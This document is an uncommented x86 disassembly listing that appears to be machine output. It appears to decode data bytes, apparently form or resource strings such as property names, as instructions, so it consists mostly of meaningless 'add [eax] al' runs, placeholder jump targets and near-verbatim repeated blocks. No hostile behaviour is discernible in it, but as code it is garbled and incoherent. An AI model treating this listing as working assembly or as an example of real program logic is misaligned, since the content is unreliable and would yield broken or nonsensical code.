add [ edx + esi + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
xor eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
outsb
jae r-xdata
outsb
cwde
push ss
inc edx
add [ eax ] dh
add [ edi ] bl
add bh bh
jo r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ eax ]
or [ ebp ] eax
cmp al 0x9
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
je r-xdata
add dh bh
fsub [ eax + 0x44 ]
add [ eax - 0x80000000 ] al
or eax 0x69420800
inc esp
imul ecx [ ebp + 0x6f ] 0x4d206564
inc esp
add [ eax - 0x17ffbb61 ] bh
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax + edi + 0x46 ]
inc esp
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
[ eax - 0x5f43ffbc ]
jae r-xdata
add bh bh
lodsb [ esi ]
mov al [ 0xffffffffa0bc0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0019 ] al
outsd
adc [ eax ] al
sbb [ edx ] al
add bh bh
sbb [ ecx + 0x43 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
pop ss
add [ ecx ] cl
dec ecx
je r-xdata
add [ edx ] bh
add bh bh
jpe r-xdata
add eax 0x336c7443
inc esp
cmp [ esi + 0x44 ] al
dec esp
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
jb r-xdata
add [ esi ] cl
insd
dec ecx
outsb
js r-xdata
add [ ecx ] 0x0
outsb
je r-xdata
mov eax [ 0x10044 ]
add [ eax ] al
push eax
popad
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
outsb
jae r-xdata
xchg [ ecx ] al
adc al 0x2
add bh bh
cld
pop ecx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050018 ] al
je r-xdata
outsb
je r-xdata
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
fcomp [ ecx ]
inc ebp
add [ eax + eax + 0x1fe00 ] bh
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
add [ eax ] eax
add [ eax ] al
insd
jae r-xdata
or [ ebp ] eax
hlt
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
and [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
sbb eax 0x61500b00
jb r-xdata
adc [ eax ] al
test eax 0x48ff0001
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
fcomp [ esi - 0x3fcbffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0xe4656c62
jl r-xdata
jo r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
outsb
je r-xdata
popad
dec esi
inc esp
add [ eax + eax ] dh
dec [ esp + eax * 8 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
or eax [ ebx + 0x6f ]
add [ eax ] al
pop ds
add [ esi ] cl
jo r-xdata
xchg ebp eax
inc ebp
add [ eax + eax ] bh
push [ eax - 0x61 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090020 ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
js r-xdata
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edx + ecx ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
in al 0xa0
inc esp
add [ ecx ] al
add [ ecx ] 0x0
add [ eax ] al
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc ebp
adc [ eax ] al
0x2cff0000 0x44a1
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ecx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
push eax
outsd
jo r-xdata
adc [ eax ] al
push edi
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
dec [ eax ]
mov eax [ 0xffffffffa0d00044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080021 ] al
push 0x6948776f
outsb
je r-xdata
je r-xdata
jne r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
push ebx
je r-xdata
in al 0x7c
inc ecx
add al al
add [ eax ] eax
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
and al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
add ah dh
dec ebp
inc esp
add [ ecx + ecx + 0x45 ] dh
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
jl r-xdata
add [ eax ] al
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x70 ] bp
adc [ eax ] al
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
jb r-xdata
push ebx
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax + 0x4f070025 ] al
outsb
inc ebx
push eax
inc esp
add al ch
add [ eax ] al
jae r-xdata
sbb al 0x0
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ edi ] eax
dec esi
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x7 ] si
ja r-xdata
inc esp
arpl [ ebp + 0x70 ] sp
je r-xdata
jb r-xdata
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002b ] al
outsb
inc ebp
outsb
je r-xdata
jl r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
jae r-xdata
imul edi [ edx + 0x65 ] 0x746e4907
jb r-xdata
add [ ecx + edx + 0x10540040 ] dl
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
inc eax
cmp [ ebx ] eax
add ecx [ esp + edx * 2 ]
inc edx
outsd
outsd
insb
popad
outsb
push edx
jae r-xdata
add [ eax ] dl
inc eax
add [ ebp + 0x39400040 ] cl
inc ebx
add [ ebx ] al
or al 0x54
inc esp
jb r-xdata
outsd
arpl [ ebx + 0x28 ] bp
push ecx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
outsb
inc ebp
js r-xdata
inc esp
imul ebp [ esi + 0x65 ] 0x55737208
jo r-xdata
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
push es
add [ edi + eax ] dh
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add ah cl
and [ ecx + 0x44 ] ah
jpe r-xdata
lea eax [ bx + si ]
int3
je r-xdata
add [ eax + eax * 8 - 0x4b5bffbc ] ch
inc esp
popad
je r-xdata
pushfd
cmp al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
cmp al [ ebx ]
pop es
add [ eax ] al
push ebx
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002e ] al
outsb
push ebx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0xbffbb6c ] cl
xchg ebx eax
add [ esp + esi * 4 - 0x5437ffbc ] ah
or [ edx + 0x73 ] esi
push eax
popad
je r-xdata
mov bl 0x44
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add al dl
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ecx + edi ] bh
inc ebx
add [ esi ] al
jb r-xdata
add [ esp + eax ] dh
popfd
inc esp
add [ edi + eax + 0x42 ] cl
jb r-xdata
pop ebx
inc ebx
dec esi
outsd
outsb
push es
jb r-xdata
inc esp
add [ eax + 0x4c00449d ] ah
pop es
inc edx
or [ ebp + 0x78 ] al
je r-xdata
add al cl
stosd [ edi ]
movsb [ edi ] [ esi ]
mov ah 0x44
dec esp
int3
je r-xdata
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ eax + 0x5b ] bl
inc ebx
add [ edi + ebp * 4 ] bh
inc esp
add [ eax ] bh
scasd [ edi ]
inc esp
add [ eax ] cl
mov al 0x44
add ah bh
xchg edx eax
inc esp
add [ eax - 0x66 ] al
inc esp
add [ ecx + ebx * 4 - 0x5d33ffbc ] ah
inc esp
add [ edx + edx * 4 + 0x44 ] al
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ eax ] bh
mov dl 0x44
add ah dh
retn 0x44
add al 0x42
insb
jae r-xdata
pop es
dec ecx
outsb
je r-xdata
inc eax
add ah dl
cmp [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
jb r-xdata
inc edx
xor al 0x4
inc ebx
sub_433020
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
push ecx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
mov al 0x34
inc eax
add [ eax ] bl
jb r-xdata
je r-xdata
fmul [ esi + 0x44 ]
add al ah
add [ eax ] al
jmp eax
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ esi + edx * 2 + 0x43 ] dh
add al dh
adc al [ ebp ]
loopne r-xdata
inc esp
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
xor al [ ebx ]
xor [ edx ] dh
inc ebx
add [ edx + eax ] ah
jb r-xdata
mov al 0x34
inc eax
add [ eax ] bl
je r-xdata
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
xor al 0x7
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ ecx - 0x3d0bffbc ] dh
inc esp
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ ecx + edi * 8 - 0x315fffbd ] dl
inc esp
add [ eax - 0x24 ] al
inc esp
add al dh
stc
inc ebx
add [ eax ] ch
fld [ eax + eax + 0x58 ]
xlat
inc esp
add al bl
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x6c ]
fild [ eax + eax + 0x3c ]
fild [ eax + eax - 0x14 ]
pop es
inc ebp
add [ ebp + 0x45 ] cl
add al ah
sbb [ ebp ] eax
xor [ eax * 2 + 0x45075800 ] al
add [ eax ] al
cli
inc ebx
add [ ebx + ebx * 2 + 0x43 ] cl
add [ 0xeb00c00 ] al
mov al 0x5
add ch bh
push [ esi + 0x435ae4ff ]
add [ ebx + ebx * 2 ] ah
inc ebx
add [ eax ] bh
pop ebx
inc ebx
add [ eax + 0x5b ] dl
inc ebx
add al al
push esi
inc ebx
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
inc esp
add al cl
stosd [ edi ]
inc ecx
add al dl
pop eax
inc ebx
add [ eax - 0x1bffbb6c ] cl
pop eax
inc ebx
add [ eax + 0x4c00449d ] ah
pop es
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add ah ah
push ebp
inc ebx
add [ esi + ecx ] al
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
jecxz r-xdata
add [ eax ] al
fdiv [ ebx + 0x7340043 ]
les edx [ bp + si + 0x44 ]
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x40 ] bp
xor [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
xor al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ edx ] dh
inc ebx
add [ eax ] dh
xor al [ ebx ]
and al 0x2
add ah bl
mov bl 0x43
add [ edi + eax ] dh
inc esp
outsd
arpl [ ebx + 0x28 ] bp
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ esi + edx * 2 + 0x43 ] dh
add al dh
adc al [ ebp ]
loopne r-xdata
jecxz r-xdata
inc edx
add [ eax + 0x18004034 ] dh
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov eax eax
dec eax
xor al [ ebx ]
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
call 0xffffffffb44378cf
mov edi 0x44
inc ebx
je r-xdata
xor al 0x7
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ ecx - 0x3d0bffbc ] dh
inc esp
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ ecx + edi * 8 - 0x315fffbd ] dl
inc esp
add [ eax - 0x24 ] al
inc esp
add al dh
stc
inc ebx
add [ eax ] ch
fld [ eax + eax + 0x58 ]
xlat
inc esp
add al bl
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x6c ]
fild [ eax + eax + 0x3c ]
fild [ eax + eax - 0x14 ]
pop es
inc ebp
add [ ebp + 0x45 ] cl
add al ah
sbb [ ebp ] eax
xor [ eax * 2 + 0x45075800 ] al
add [ eax ] al
cli
inc ebx
add [ ebx + ebx * 2 + 0x43 ] cl
add [ ebx ] cl
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
pushfd
xor eax [ ebx ]
pop es
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov esp 0x44004332
xor al [ ebx ]
das
add [ eax ] cl
inc ebp
js r-xdata
inc esp
add al cl
stosd [ edi ]
inc ecx
add al dl
pop eax
inc ebx
add [ eax - 0x1bffbb6c ] cl
pop eax
inc ebx
add [ eax + 0x4c00449d ] ah
pop es
inc edx
add [ esp + eax ] dh
outsd
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
inc eax
xor [ ebx ] eax
and [ ebp + 0xb0043 ] dh
or [ ebp + 0x78 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] sub_421698
jo r-xdata
add [ eax - 0x80000000 ] al
push cs
add [ edi ] al
inc ebx
popad
jo r-xdata
lahf
inc esp
add [ edi + edi * 4 + 0x44 ] dh
insb
jae r-xdata
je r-xdata
add bh bh
pop eax
mov eax [ 0xffffffffa1740044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ ecx ] ah
add bh bh
or al 0x93
inc esp
add [ eax + 0x4493 ] ch
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax + 0x46 ] dl
inc esp
add [ ebx ] bl
add bh bh
int3
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add ah ah
push ebp
inc ebx
add [ esi + ecx ] al
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
insb
jae r-xdata
xor ah 0xff
adc [ eax ] al
sbb al 0x2
add bh bh
dec eax
pop ecx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
pushfd
jpo r-xdata
add [ edx + esi + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
xor eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
outsb
jae r-xdata
outsb
cwde
push ss
inc edx
add [ eax ] dh
add [ edi ] bl
add bh bh
jo r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ eax ]
or [ ebp ] eax
cmp al 0x9
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
je r-xdata
add dh bh
fsub [ eax + 0x44 ]
add [ eax - 0x80000000 ] al
or eax 0x69420800
inc esp
imul ecx [ ebp + 0x6f ] 0x4d206564
inc esp
add [ eax - 0x17ffbb61 ] bh
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax + edi + 0x46 ]
inc esp
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
[ eax - 0x5f43ffbc ]
jae r-xdata
add bh bh
lodsb [ esi ]
mov al [ 0xffffffffa0bc0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0019 ] al
outsd
adc [ eax ] al
sbb [ edx ] al
add bh bh
sbb [ ecx + 0x43 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
pop ss
add [ ecx ] cl
dec ecx
je r-xdata
add [ edx ] bh
add bh bh
jpe r-xdata
add eax 0x336c7443
inc esp
cmp [ esi + 0x44 ] al
dec esp
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
jb r-xdata
add [ esi ] cl
insd
dec ecx
outsb
js r-xdata
add [ ecx ] 0x0
outsb
je r-xdata
mov eax [ 0x10044 ]
add [ eax ] al
push eax
popad
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
outsb
jae r-xdata
xchg [ ecx ] al
adc al 0x2
add bh bh
cld
pop ecx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050018 ] al
je r-xdata
outsb
je r-xdata
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
fcomp [ ecx ]
inc ebp
add [ eax + eax + 0x1fe00 ] bh
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
add [ eax ] eax
add [ eax ] al
insd
jae r-xdata
or [ ebp ] eax
hlt
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
and [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
sbb eax 0x61500b00
jb r-xdata
adc [ eax ] al
test eax 0x48ff0001
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
fcomp [ esi - 0x3fcbffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0xe4656c62
jl r-xdata
jo r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
outsb
je r-xdata
popad
dec esi
inc esp
add [ eax + eax ] dh
dec [ esp + eax * 8 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
or eax [ ebx + 0x6f ]
add [ eax ] al
pop ds
add [ esi ] cl
jo r-xdata
xchg ebp eax
inc ebp
add [ eax + eax ] bh
push [ eax - 0x61 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090020 ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
js r-xdata
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edx + ecx ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
in al 0xa0
inc esp
add [ ecx ] al
add [ ecx ] 0x0
add [ eax ] al
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc ebp
adc [ eax ] al
0x2cff0000 0x44a1
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ecx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
push eax
outsd
jo r-xdata
adc [ eax ] al
push edi
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
dec [ eax ]
mov eax [ 0xffffffffa0d00044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080021 ] al
push 0x6948776f
outsb
je r-xdata
je r-xdata
jne r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
push ebx
je r-xdata
in al 0x7c
inc ecx
add al al
add [ eax ] eax
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
and al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
add ah dh
dec ebp
inc esp
add [ ecx + ecx + 0x45 ] dh
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
jl r-xdata
add [ eax ] al
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x70 ] bp
adc [ eax ] al
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
jb r-xdata
push ebx
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax + 0x4f070025 ] al
outsb
inc ebx
push eax
inc esp
add al ch
add [ eax ] al
jae r-xdata
sbb al 0x0
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ edi ] eax
dec esi
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x7 ] si
ja r-xdata
inc esp
arpl [ ebp + 0x70 ] sp
je r-xdata
jb r-xdata
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
